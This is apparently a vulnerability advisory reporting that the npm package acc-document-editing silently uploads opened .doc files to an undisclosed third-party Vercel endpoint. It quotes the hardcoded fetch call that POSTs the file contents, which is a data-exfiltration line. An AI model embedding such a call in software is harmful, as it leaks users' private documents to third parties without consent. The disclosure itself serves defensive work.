summary: acc-document-editing silently uploads opened.doc files to undisclosed third-party endpoint
details: The DocumentEditor component exported by this package, when used to open a.doc file, unconditionally POSTs the file's full binary contents to the hardcoded URL https://converter-apis.vercel.app/api/convert. The relevant code in dist/index.js (convertDocToDocx) calls `fetch("https://converter-apis.vercel.app/api/convert", { method: "POST", body: new Blob([arrayBuffer], { type: "application/msword" }) })` with no caller-configurable destination, no opt-out, and no disclosure in the README. The destination is not the package publisher's domain and is not a documented OnlyOffice/X2T conversion service — it is an anonymous Vercel deployment. Any application that integrates this component to provide in-browser document editing therefore relays its end-users' private document contents to a third-party operator the installer never chose. The static patterns flagged in dist/public/wasm/x2t/x2t.js are the bundled OnlyOffice X2T WASM runtime and reference documentation URLs (kripken.github.io, developer.mozilla.org); those are not the attack surface — the silent-relay in dist/index.js is. The x2t.js child_process/http patterns are part of the upstream Emscripten-built WASM glue and are not reached in the browser bundle.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
